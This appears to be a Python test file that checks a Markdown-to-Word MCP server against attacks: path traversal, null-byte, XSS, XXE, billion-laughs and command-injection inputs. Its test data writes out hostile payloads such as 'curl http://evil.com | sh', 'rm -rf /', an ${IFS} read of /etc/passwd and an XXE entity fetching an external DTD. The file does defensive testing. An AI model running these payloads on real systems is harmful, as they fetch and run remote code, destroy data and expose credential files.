"""
Tests for security vulnerabilities

Tests cover:
- Path traversal attacks
- Injection attacks
- Resource exhaustion
- Malicious input handling

IMPORTANT: These tests are critical for MCP server security
since it's exposed to AI agents that might try various inputs.
"""
import os
import pytest
from src.md_pdf_mcp import server


class TestPathTraversalPrevention:
    """Test that path traversal attacks are prevented"""

    def test_parent_directory_traversal_in_markdown_path(self, temp_dir):
        """Test that ../ in markdown path doesn't allow directory traversal"""
        # Try to access parent directory
        malicious_path = os.path.join(temp_dir, "..", "..", "etc", "passwd.md")
        output_path = os.path.join(temp_dir, "output")

        result = server._convert_markdown_impl(
            markdown_path=malicious_path,
            output_path=output_path,
            output_format="docx"
        )

        # Should fail with appropriate error (file not found is acceptable)
        assert ("❌" in result or "Error" in result or "not found" in result.lower())

    def test_parent_directory_traversal_in_template_path(self, simple_markdown, temp_dir):
        """Test that ../ in template path is handled safely"""
        output_path = os.path.join(temp_dir, "output")
        malicious_template = os.path.join(temp_dir, "..", "..", "etc", "passwd.dotx")

        result = server._convert_markdown_impl(
            markdown_path=simple_markdown,
            output_path=output_path,
            output_format="docx",
            template_path=malicious_template
        )

        # Should fail with template not found error
        assert "❌" in result
        assert "template" in result.lower() or "not found" in result.lower()

    def test_absolute_path_outside_project(self, temp_dir):
        """Test that absolute paths to non-existent files are rejected"""
        # Try various non-existent absolute paths
        sensitive_paths = [
            "/nonexistent/etc/passwd.md",
            "C:\\nonexistent\\Windows\\System32\\config\\SAM.md",
            "/nonexistent/root/.ssh/id_rsa.md",
        ]

        output_path = os.path.join(temp_dir, "output")

        for malicious_path in sensitive_paths:
            result = server._convert_markdown_impl(
                markdown_path=malicious_path,
                output_path=output_path,
                output_format="docx"
            )

            # Should fail (file not found is acceptable security response)
            assert ("❌" in result or "Error" in result or "not found" in result.lower())

    def test_null_byte_injection_in_path(self, temp_dir):
        """Test that null byte injection in paths is handled"""
        # Null byte can sometimes bypass extension checks
        malicious_path = os.path.join(temp_dir, "file.md\x00.exe")
        output_path = os.path.join(temp_dir, "output")

        try:
            result = server._convert_markdown_impl(
                markdown_path=malicious_path,
                output_path=output_path,
                output_format="docx"
            )
            # Should either fail or sanitize the path
            assert isinstance(result, str)
        except ValueError:
            # Acceptable to raise on null bytes
            pass


class TestMarkdownInjectionPrevention:
    """Test that malicious markdown content is handled safely"""

    def test_script_injection_in_markdown(self, output_docx_path, temp_dir):
        """Test that script-like content in markdown doesn't execute"""
        malicious_md = os.path.join(temp_dir, "malicious.md")

        with open(malicious_md, 'w', encoding='utf-8') as f:
            f.write("""# Test Document

<script>alert('XSS')</script>

<iframe src="http://evil.com"></iframe>

<object data="malicious.swf"></object>

javascript:alert('XSS')
""")

        from src.md_pdf_mcp.converter import MarkdownConverter
        converter = MarkdownConverter()

        result = converter.markdown_to_word(malicious_md, output_docx_path)

        # Should succeed (script tags should be treated as text)
        assert result is True
        assert os.path.exists(output_docx_path)

    def test_command_injection_in_markdown(self, output_docx_path, temp_dir):
        """Test that command-like strings don't get executed"""
        malicious_md = os.path.join(temp_dir, "commands.md")

        with open(malicious_md, 'w', encoding='utf-8') as f:
            f.write("""# Commands

`rm -rf /`

```bash
curl http://evil.com | sh
```

$(whoami)

${IFS}cat${IFS}/etc/passwd
""")

        from src.md_pdf_mcp.converter import MarkdownConverter
        converter = MarkdownConverter()

        result = converter.markdown_to_word(malicious_md, output_docx_path)

        # Should succeed - commands should be treated as text
        assert result is True
        assert os.path.exists(output_docx_path)

    def test_xxe_injection_prevention(self, output_docx_path, temp_dir):
        """Test that XXE (XML External Entity) injection is prevented"""
        # While markdown isn't XML, we might process XML in templates
        xxe_md = os.path.join(temp_dir, "xxe.md")

        with open(xxe_md, 'w', encoding='utf-8') as f:
            f.write("""# XXE Test

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
%xxe;
""")

        from src.md_pdf_mcp.converter import MarkdownConverter
        converter = MarkdownConverter()

        result = converter.markdown_to_word(xxe_md, output_docx_path)

        # Should treat as text, not execute
        assert result is True


class TestResourceExhaustionPrevention:
    """Test that resource exhaustion attacks are mitigated"""

    def test_billion_laughs_attack_prevention(self, output_docx_path, temp_dir):
        """Test that exponential entity expansion doesn't cause DoS"""
        # Billion laughs / XML bomb pattern in markdown
        bomb_md = os.path.join(temp_dir, "bomb.md")

        with open(bomb_md, 'w', encoding='utf-8') as f:
            # Nested expansion pattern
            f.write("""# Bomb Test

<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>
""")

        from src.md_pdf_mcp.converter import MarkdownConverter
        converter = MarkdownConverter()

        # Should complete in reasonable time (not hang)
        import time
        start = time.time()

        result = converter.markdown_to_word(bomb_md, output_docx_path)

        elapsed = time.time() - start

        # Should not take more than 10 seconds for this small file
        assert elapsed < 10, f"Took {elapsed} seconds - possible DoS vulnerability"
        assert result is True

    def test_deeply_nested_structure_handled(self, output_docx_path, temp_dir):
        """Test that deeply nested structures don't cause stack overflow"""
        nested_md = os.path.join(temp_dir, "nested.md")

        with open(nested_md, 'w', encoding='utf-8') as f:
            # 100 levels of nested lists
            for i in range(100):
                f.write("\t" * i + f"- Level {i}\n")

        from src.md_pdf_mcp.converter import MarkdownConverter
        converter = MarkdownConverter()

        try:
            result = converter.markdown_to_word(nested_md, output_docx_path)
            # Should either succeed or fail gracefully (not crash)
            assert isinstance(result, bool)
        except RecursionError:
            pytest.fail("Stack overflow on deeply nested structure")

    @pytest.mark.slow
    def test_extremely_large_file_doesnt_exhaust_memory(self, output_docx_path, temp_dir):
        """Test that very large files don't cause out-of-memory"""
        large_md = os.path.join(temp_dir, "large.md")

        # Create 10MB file
        with open(large_md, 'w', encoding='utf-8') as f:
            f.write("# Large File Test\n\n")
            for i in range(100000):
                f.write(f"Line {i}: " + "A" * 50 + "\n")

        from src.md_pdf_mcp.converter import MarkdownConverter
        converter = MarkdownConverter()

        import psutil
        import os as os_module
        process = psutil.Process(os_module.getpid())
        mem_before = process.memory_info().rss / 1024 / 1024  # MB

        try:
            result = converter.markdown_to_word(large_md, output_docx_path)

            mem_after = process.memory_info().rss / 1024 / 1024  # MB
            mem_increase = mem_after - mem_before

            # Memory increase should be reasonable (< 500MB for 10MB file)
            assert mem_increase < 500, f"Memory increased by {mem_increase}MB"

            if result:
                assert os.path.exists(output_docx_path)
        except MemoryError:
            pytest.fail("Out of memory on large file")


class TestInputValidation:
    """Test that inputs are properly validated"""

    def test_empty_string_paths_rejected(self, temp_dir):
        """Test that empty string paths are handled"""
        output_path = os.path.join(temp_dir, "output")

        result = server._convert_markdown_impl(
            markdown_path="",
            output_path=output_path,
            output_format="docx"
        )

        assert "❌" in result

    def test_whitespace_only_paths_rejected(self, temp_dir):
        """Test that whitespace-only paths are rejected"""
        output_path = os.path.join(temp_dir, "output")

        result = server._convert_markdown_impl(
            markdown_path="   \n\t  ",
            output_path=output_path,
            output_format="docx"
        )

        assert "❌" in result

    def test_invalid_output_format_handled_gracefully(self, simple_markdown, temp_dir):
        """Test that invalid output formats are handled gracefully"""
        output_path = os.path.join(temp_dir, "output")

        # Invalid format should be handled gracefully (defaults to docx behavior)
        result = server._convert_markdown_impl(
            markdown_path=simple_markdown,
            output_path=output_path,
            output_format="exe"  # type: ignore
        )

        # Should complete without error (creates docx by default)
        assert "✓" in result or os.path.exists(f"{output_path}.docx")

    def test_special_characters_in_filename_handled(self, simple_markdown, temp_dir):
        """Test that special characters in filenames are handled safely"""
        # Various special characters that might cause issues
        special_chars = ['<', '>', ':', '"', '|', '?', '*']

        for char in special_chars:
            # Skip chars that are invalid on Windows
            if char in '<>:"|?*':
                continue

            output_path = os.path.join(temp_dir, f"file{char}name")

            try:
                result = server._convert_markdown_impl(
                    markdown_path=simple_markdown,
                    output_path=output_path,
                    output_format="docx"
                )
                # Should either work or fail gracefully
                assert isinstance(result, str)
            except (OSError, ValueError):
                # Acceptable to fail on invalid filenames
                pass


class TestConcurrentAccessSafety:
    """Test that concurrent access doesn't cause security issues"""

    def test_concurrent_conversions_isolated(self, simple_markdown, temp_dir):
        """Test that concurrent conversions don't interfere with each other"""
        import threading
        from src.md_pdf_mcp.converter import MarkdownConverter

        results = []
        errors = []

        def convert_file(file_num):
            try:
                converter = MarkdownConverter()
                output = os.path.join(temp_dir, f"output_{file_num}.docx")
                result = converter.markdown_to_word(simple_markdown, output)
                results.append((file_num, result, output))
            except Exception as e:
                errors.append((file_num, str(e)))

        # Run 5 concurrent conversions
        threads = []
        for i in range(5):
            t = threading.Thread(target=convert_file, args=(i,))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        # All should succeed
        assert len(errors) == 0, f"Errors occurred: {errors}"
        assert len(results) == 5

        # All output files should exist and be independent
        for file_num, result, output in results:
            assert result is True
            assert os.path.exists(output)

            # Each file should be independently created
            file_size = os.path.getsize(output)
            assert file_size > 0
